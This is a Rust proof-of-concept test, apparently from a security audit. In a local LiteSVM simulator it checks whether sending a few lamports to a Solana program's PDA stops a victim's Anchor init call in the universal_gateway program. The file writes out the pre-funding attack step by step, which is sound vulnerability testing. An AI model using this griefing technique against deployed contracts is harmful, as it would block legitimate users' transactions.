// Empirical test of the "pre-fund the PDA to brick init" crook move, against
// Anchor 0.31.1's real `init` in the compiled program.
//
// The attacker's only primitive against a PDA address is a plain lamport
// transfer (it is off-curve; nobody can sign create_account for it). Question:
// does Anchor 0.31.1 `init` fail if the target PDA already holds lamports?
//
// If it FAILS  -> pre-funding bricks every init(ExecutedSubTx) in execute/revert/
//                 rescue for 1 lamport. Far stronger than the StoredIxData squat.
// If it PASSES -> Anchor handles pre-funding (allocate+assign), attack is dead.
//
// Reuses store_execute_ix_data because its `init` needs no gateway setup.

use litesvm::LiteSVM;
use sha2::{Digest, Sha256};
use sha3::Keccak256;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    system_instruction, system_program,
    transaction::Transaction,
};

const PROGRAM_ID: Pubkey = solana_sdk::pubkey!("DJoFYDpgbTfxbXBv1QYhYGc9FK4J5FUKpYXAfSkHryXp");
const D_STORE: [u8; 8] = [177, 199, 114, 191, 66, 93, 93, 110];
const STORED_IX_DATA_SEED: &[u8] = b"stored_ix_data";

fn keccak(d: &[u8]) -> [u8; 32] {
    let mut h = Keccak256::new();
    h.update(d);
    let mut r = [0u8; 32];
    r.copy_from_slice(&h.finalize());
    r
}

fn store_ix(caller: &Pubkey, pda: &Pubkey, sub: &[u8; 32], hash: &[u8; 32], ix: &[u8]) -> Instruction {
    let mut data = Vec::new();
    data.extend_from_slice(&D_STORE);
    data.extend_from_slice(sub);
    data.extend_from_slice(hash);
    data.extend_from_slice(&(ix.len() as u32).to_le_bytes());
    data.extend_from_slice(ix);
    Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(*caller, true),
            AccountMeta::new(*pda, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data,
    }
}

fn main() {
    let mut svm = LiteSVM::new();
    let so = std::fs::read(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../pushchain/contracts/svm-gateway/target/deploy/universal_gateway.so"
    ))
    .unwrap();
    svm.add_program(PROGRAM_ID, &so);

    let attacker = Keypair::new();
    let victim = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    svm.airdrop(&victim.pubkey(), 10_000_000_000).unwrap();

    let sub_tx_id: [u8; 32] = {
        let mut h = Sha256::new();
        h.update(b"prefund-griefing test");
        let mut r = [0u8; 32];
        r.copy_from_slice(&h.finalize());
        r
    };
    let ix_data = vec![0xCDu8; 64];
    let hash = keccak(&ix_data);
    let (pda, _b) = Pubkey::find_program_address(&[STORED_IX_DATA_SEED, &sub_tx_id, &hash], &PROGRAM_ID);

    println!("== Anchor 0.31.1 init pre-fund griefing test (real program) ==");
    println!("target PDA: {pda}");

    // Attacker's only primitive: transfer lamports to the off-curve PDA address.
    for dust in [1u64, 890_880 /* ~rent-exempt for tiny acct */] {
        // fresh PDA per attempt so state does not carry over
        let salt = dust.to_le_bytes();
        let mut h = Sha256::new();
        h.update(b"prefund-griefing test");
        h.update(salt);
        let mut sub = [0u8; 32];
        sub.copy_from_slice(&h.finalize());
        let (pda, _b) = Pubkey::find_program_address(&[STORED_IX_DATA_SEED, &sub, &hash], &PROGRAM_ID);

        let t = system_instruction::transfer(&attacker.pubkey(), &pda, dust);
        let tx = Transaction::new_signed_with_payer(&[t], Some(&attacker.pubkey()), &[&attacker], svm.latest_blockhash());
        svm.send_transaction(tx).unwrap();
        let bal = svm.get_balance(&pda).unwrap_or(0);
        let acct = svm.get_account(&pda).unwrap_or(Account::default());
        println!("\n-- pre-funded PDA with {dust} lamports (owner now {}, data {} bytes)", acct.owner, acct.data.len());

        // Victim now performs the legitimate init.
        let ix = store_ix(&victim.pubkey(), &pda, &sub, &hash, &ix_data);
        let tx = Transaction::new_signed_with_payer(&[ix], Some(&victim.pubkey()), &[&victim], svm.latest_blockhash());
        match svm.send_transaction(tx) {
            Ok(_) => {
                let a = svm.get_account(&pda).unwrap();
                println!("   victim init SUCCEEDED (owner {}, data {} bytes). Pre-fund did NOT brick init.", a.owner, a.data.len());
            }
            Err(e) => {
                println!("   victim init FAILED -> pre-fund BRICKS init. err: {:?}", e.err);
            }
        }
        let _ = bal;
    }

    println!("\n== verdict printed above ==");
}
